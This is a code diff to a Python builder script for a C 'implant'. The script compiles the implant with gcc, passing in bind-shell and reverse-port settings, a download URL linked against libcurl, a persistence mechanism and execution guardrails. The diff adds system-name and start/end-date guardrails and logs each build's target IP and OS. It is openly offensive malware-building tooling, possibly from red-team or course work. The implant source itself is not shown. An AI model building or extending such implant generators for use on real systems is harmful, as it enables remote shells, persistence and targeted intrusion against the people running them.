@@ -6,11 +6,10 @@ import subprocess
 import csv
 import os.path as filesys
 
-import subprocess
 
 #------------------------------#
 # A delicious c-based "implant"
-# written by some brave CWE 
+# written by some brave CWE
 # wannabes :D      ENJOY!
 #------------------------------#
 
@@ -36,6 +35,10 @@ parser.add_argument("-a", "--architecture", type=str, metavar='',
                     help="system architecture", default="unknown")
 parser.add_argument("-os", "--os", type=str, metavar='',
                     help="operating system", default="unknown")
+parser.add_argument("-sd", "--startdate", type=str,
+                    help="start date", metavar='', default="unknown")
+parser.add_argument("-ed", "--enddate", type=str,
+                    help="end date", metavar='', default="unknown")
 parser.add_argument("-lv", "--libcversion", type=str, metavar='',
                     help="libc version", default="unknown")
 parser.add_argument("-kv", "--kernversion", type=str, metavar='',
@@ -46,6 +49,8 @@ parser.add_argument("-eg", "--execguardrails", type=str, metavar='',
                     help="execution guardrails", default="unknown")
 parser.add_argument("-pm", "--persistmech", type=str, metavar='',
                     help="persistence mechanism", default="unknown")
+parser.add_argument("-sn", "--systemname", type=str, metavar='',
+                    help="system name", default="unknown")
 
 ##### Attacks #####
 parser.add_argument("-atkB", "--bindShell", type=int, metavar='',
@@ -71,18 +76,16 @@ args = parser.parse_args()
 
 ##### Logging #####
 log_exists = filesys.isfile('log.csv')
-
 with open('log.csv', mode='a+') as log_file:
+        log_writer = csv.writer(log_file, delimiter='\t',
+                                quotechar='"', quoting=csv.QUOTE_MINIMAL)
+        if (log_exists != 1):
+                fieldnamesList = ["datetime", "ipAddress",
+                                "tgtArch", "tgtOS", "outputName"]
+                log_writer.writerow(fieldnamesList)
 
-    log_writer = csv.writer(log_file, delimiter='\t',
-                            quotechar='"', quoting=csv.QUOTE_MINIMAL)
-    if (log_exists != 1):
-        fieldnamesList = ["datetime", "ipAddress",
-                          "tgtArch", "tgtOS", "outputName"]
-        log_writer.writerow(fieldnamesList)
-
-    log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(
-        args.architecture), str(args.os), str(args.outputName)])
+        log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(
+                args.architecture), str(args.os), str(args.outputName)])
 
 
 # This is the gcc command framework that will be eventually executed to compile the implant
@@ -100,9 +103,7 @@ if args.reversePort != "unknown":
     cmdString.insert(1, "-D PORT=\"" + (args.reversePort) + "\"")
 if args.downloadURL != "www.example.com":
     cmdString.insert(1, "-D URL=\"" + (args.downloadURL) + "\"")
-    cmdString.append("-lcurl") # -lcurl is required to include the libcurl library
-
-# print(str(args.ipAddress))
+    cmdString.append("-lcurl")  # -lcurl is required to include the libcurl library
 
 ##### Guardrails #####
 if args.architecture != "unknown":
@@ -119,6 +120,12 @@ if args.execguardrails != "unknown":
     cmdString.insert(1, "-D EXEC=\"" + (args.execguardrails) + "\"")
 if args.persistmech != "unknown":
     cmdString.insert(1, "-D PERM=\"" + (args.persistmech) + "\"")
+if args.systemname != "unknown":
+    cmdString.insert(1, "-D SYSN=\"" + (args.systemname) + "\"")
+if args.startdate != "unknown":
+    cmdString.insert(1, "-D STRD=\"" + (args.startdate) + "\"")
+if args.enddate != "unknown":
+    cmdString.insert(1, "-D ENDD=\"" + (args.enddate) + "\"")
 
 ##### Implant Testing #####
 if args.debug:
